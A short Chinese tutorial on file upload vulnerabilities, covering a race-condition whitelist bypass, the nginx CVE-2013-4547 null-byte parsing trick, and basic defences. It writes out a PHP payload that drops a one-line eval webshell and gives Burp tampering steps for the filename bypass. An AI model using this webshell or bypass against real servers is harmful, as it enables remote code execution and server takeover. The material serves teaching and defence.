**文件上传漏洞原理:**  

网站Web应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型，此时攻击者就可以上传一个webshell到一个Web可访问的目录上，并将恶意文件传递给如PHP解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护。

**4.服务器白名单绕过**  

(1)条件竞争绕过:  

如果服务器判断逻辑为:用户上传恶意文件后,服务器首先把恶意文件存储到一个临时目录,如果判断文件不符合要求,则删除,如果符合则移动到上传目录  

*   
*   
*   

```
用户可以上传<?php fputs(fopen("info.php", "w"), '<?php @eval($_POST["x"]);?>'); ?>文件,然后不断访问该文件,在服务器判断该文件是否符合上传类型时,重新生成一个新木马,就算服务器删除该上传文件,新木马也会留在服务器
```

*   nginx解析漏洞(CVE-2013-4547)文件名逻辑漏洞  
    

针对windows  

*   
*   
*   
*   

```
上传图片马1.jpg文件,访问1.jpg.php文件,burp抓包,修改为1.jpg%20%00.php,然后放包,就会将1.jpg文件解析为php文件原理:nginx遇到php结尾文件,会交给fastcgi去处理,fastcgi遇到空格加00会截断，并且当接收到的文件当作php去处理
```

针对linux(linux不会自动去空格)

```

```

**文件上传防御**

*   使用后端服务器验证,并且使用白名单限制  
    
*   上传目录设置不可执行权限
    
*   使用随机数命名上传文件  
    
*   服务端不返回上传路径
